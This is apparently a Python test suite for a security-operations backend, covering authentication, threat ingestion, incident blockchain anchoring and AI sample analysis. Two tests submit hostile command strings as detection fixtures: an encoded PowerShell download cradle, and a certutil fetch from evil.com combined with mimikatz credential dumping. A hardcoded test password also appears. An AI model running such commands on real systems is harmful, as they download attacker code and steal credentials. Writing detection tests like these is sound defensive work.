"""
Comprehensive Automated Test Suite for Sentinel Chain Backend.
Verifies all REST endpoints, cryptographic blockchain ledger verification,
AI entropy analysis, and multi-stage incident response workflows.
"""

import sys
import json
import urllib.request
import urllib.error
import threading
import time
from pathlib import Path

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

# Ensure root in path
BASE_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE_DIR))

from server import ThreadedHTTPServer, SentinelRequestHandler
from backend.database import init_db

TEST_PORT = 8999
BASE_URL = f"http://127.0.0.1:{TEST_PORT}"


def make_request(path: str, method: str = "GET", data: dict = None, token: str = None) -> tuple:
    """Helper to execute HTTP request against test server."""
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    req_data = json.dumps(data).encode("utf-8") if data else None
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)

    try:
        with urllib.request.urlopen(req) as res:
            body = res.read().decode("utf-8")
            return res.status, json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8")
        try:
            return e.code, json.loads(body) if body else {}
        except Exception:
            return e.code, {"error": body}


def run_tests():
    print("=" * 60)
    print("[*] STARTING SENTINEL CHAIN AUTOMATED BACKEND TESTS")
    print("=" * 60)

    # 1. Initialize DB
    print("[*] Initializing Database & Seed Records...")
    init_db()

    # 2. Launch background test server
    server = ThreadedHTTPServer(("127.0.0.1", TEST_PORT), SentinelRequestHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    time.sleep(0.5)

    passed = 0
    total = 0

    def assert_test(name, condition, details=""):
        nonlocal passed, total
        total += 1
        if condition:
            passed += 1
            print(f"  [PASS] {name}")
        else:
            print(f"  [FAIL] {name}: {details}")

    try:
        # TEST 1: Health
        status, res = make_request("/api/health")
        assert_test("Health Endpoint (/api/health)", status == 200 and res.get("status") == "healthy", str(res))

        # TEST 2: Auth Login
        status, res = make_request("/api/auth/login", method="POST", data={
            "email": "riya.singh@sentinelchain.io",
            "password": "Sentinel@2026!"
        })
        assert_test("User Login (/api/auth/login)", status == 200 and "token" in res, str(res))
        token = res.get("token")

        # TEST 3: Auth Profile (Me)
        status, res = make_request("/api/auth/me", token=token)
        assert_test("Get Profile (/api/auth/me)", status == 200 and res.get("user", {}).get("role") == "Administrator", str(res))

        # TEST 4: Dashboard Stats
        status, res = make_request("/api/dashboard/stats")
        assert_test("Dashboard Stats (/api/dashboard/stats)", status == 200 and "threatScore" in res, str(res))

        # TEST 5: Threats List
        status, res = make_request("/api/threats")
        assert_test("List Threats (/api/threats)", status == 200 and res.get("total", 0) > 0, str(res))

        # TEST 6: Ingest New Threat with Payload
        status, res = make_request("/api/threats", method="POST", data={
            "title": "Unsigned Trojan Binary Execution",
            "targetAsset": "Laptop-01",
            "rawPayload": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp",
            "severity": "critical"
        })
        new_threat_id = res.get("id")
        assert_test("Ingest Threat with AI classification (/api/threats)", status == 201 and new_threat_id is not None, str(res))

        # TEST 7: Quarantine Threat
        if new_threat_id:
            status, res = make_request(f"/api/threats/{new_threat_id}/quarantine", method="POST")
            assert_test("Quarantine Host (/api/threats/:id/quarantine)", status == 200 and res.get("success") is True, str(res))

        # TEST 8: Incidents List
        status, res = make_request("/api/incidents")
        assert_test("List Incidents (/api/incidents)", status == 200 and res.get("total", 0) > 0, str(res))

        # TEST 9: Create Incident & Anchor to Blockchain
        status, res = make_request("/api/incidents", method="POST", data={
            "title": "Unauthorized Privilege Escalation on Finance-Server-01",
            "severity": "critical",
            "affectedAssets": ["Finance-Server-01"],
            "anchorToBlockchain": True
        })
        new_inc_id = res.get("id")
        assert_test("Create Incident with Blockchain Anchor (/api/incidents)", status == 201 and res.get("blockchainVerified") is True, str(res))

        # TEST 10: Evidence List
        status, res = make_request("/api/blockchain/evidence")
        assert_test("Query Evidence Records (/api/blockchain/evidence)", status == 200 and len(res.get("items", [])) > 0, str(res))

        # TEST 11: Cryptographic Verification of Evidence
        first_ev_id = res.get("items", [{}])[0].get("id")
        if first_ev_id:
            status, res = make_request(f"/api/blockchain/verify/{first_ev_id}", method="POST")
            assert_test(f"Cryptographic Verification of {first_ev_id}", status == 200 and res.get("valid") is True, str(res))

        # TEST 12: Audit Blockchain Chain Integrity (Genesis to Tip)
        status, res = make_request("/api/blockchain/audit-chain")
        assert_test("Audit Entire Ledger Integrity (/api/blockchain/audit-chain)", status == 200 and res.get("valid") is True, str(res))

        # TEST 13: AI Analyze Sample (Shannon Entropy & MITRE Detection)
        sample_code = "cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/payload.exe; mimikatz.exe sekurlsa::logonpasswords"
        status, res = make_request("/api/ai/analyze-sample", method="POST", data={
            "sample": sample_code,
            "target": "Finance-Server-01"
        })
        assert_test("AI Entropy & MITRE Engine (/api/ai/analyze-sample)", status == 200 and res.get("confidence", 0) >= 80, str(res))

        # TEST 14: Assets List & Details
        status, res = make_request("/api/assets")
        assert_test("List Assets (/api/assets)", status == 200 and res.get("total", 0) > 0, str(res))

        # TEST 15: SOC Team Roster
        status, res = make_request("/api/soc/team")
        assert_test("SOC Team Roster (/api/soc/team)", status == 200 and len(res.get("team", [])) > 0, str(res))

        # TEST 16: Audit Logs Trail
        status, res = make_request("/api/audit-logs")
        assert_test("Audit Trail Retrieval (/api/audit-logs)", status == 200 and len(res.get("logs", [])) > 0, str(res))

        # TEST 17: Static SPA Fallback
        req = urllib.request.Request(f"{BASE_URL}/live-threats")
        with urllib.request.urlopen(req) as resp:
            spa_status = resp.status
        assert_test("SPA Route Fallback (/live-threats -> index.html)", spa_status == 200)

    finally:
        server.shutdown()
        server.server_close()

    print("=" * 60)
    print(f"RESULTS: {passed}/{total} TESTS PASSED ({round(passed/total * 100, 1)}%)")
    print("=" * 60)
    return passed == total


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
